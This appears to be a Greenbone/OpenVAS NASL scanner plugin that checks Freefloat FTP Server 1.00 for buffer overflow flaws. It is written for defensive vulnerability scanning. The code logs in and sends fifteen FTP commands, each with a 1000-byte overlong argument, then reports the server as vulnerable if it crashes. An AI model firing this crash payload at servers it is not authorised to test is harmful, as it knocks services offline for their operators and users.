# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900292");
  script_version("2022-02-17T14:14:34+0000");
  script_tag(name:"last_modification", value:"2022-02-17 14:14:34 +0000 (Thu, 17 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-07-27 09:16:39 +0200 (Wed, 27 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Freefloat FTP Server POST Auth Multiple Commands Buffer Overflow Vulnerabilities");
  script_xref(name:"URL", value:"http://secpod.org/blog/?p=310");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17550");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103166");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103162");
  script_xref(name:"URL", value:"http://secpod.org/SECPOD_FreeFloat_FTP_Server_BoF_PoC.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_FreeFloat_FTP_Server_BoF.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/freefloat/detected");

  script_tag(name:"impact", value:"Successful exploits may allow remote attackers to execute arbitrary
  code on the system or cause the application to crash.");

  script_tag(name:"affected", value:"FreeFloat Ftp Server Version 1.00, Other versions
  may also be affected.");

  script_tag(name:"insight", value:"The flaw is due to improper bounds checking when processing
  'ACCL', 'AUTH', 'APPE', 'ALLO', 'ACCT' multiple commands with specially-crafted
  an overly long parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Freefloat FTP Server is prone to multiple buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "220 FreeFloat" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 FreeFloat" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  exit(0);
}

ftplogin = ftp_log_in(socket:soc1, user:"test", pass:"test");
if(!ftplogin){
  exit(0);
}

vuln_cmds = make_list('ACCL', 'AUTH', 'APPE', 'ALLO', 'ACCT', 'DELE',
                      'MDTM', 'RETR', 'RMD', 'STAT', 'SIZE', 'STOR',
                      'RNTO', 'RNFR', 'STOU');

foreach cmd (vuln_cmds)
{
  send(socket:soc1, data:string(cmd, ' ', crap(length: 1000, data:'A'), '\r\n'));
  sleep (1);

  soc2 = open_sock_tcp(ftpPort);
  if(!soc2){
    security_message(port:ftpPort);
    exit(0);
  }

  # nb: Some times the server is listening but won't respond
  banner = recv(socket:soc2, length:512);
  if(!banner || "220 FreeFloat" >!< banner){
    close(soc2);
    security_message(port:ftpPort);
    exit(0);
  }
  ftp_close(socket:soc2);
}

ftp_close(socket:soc1);
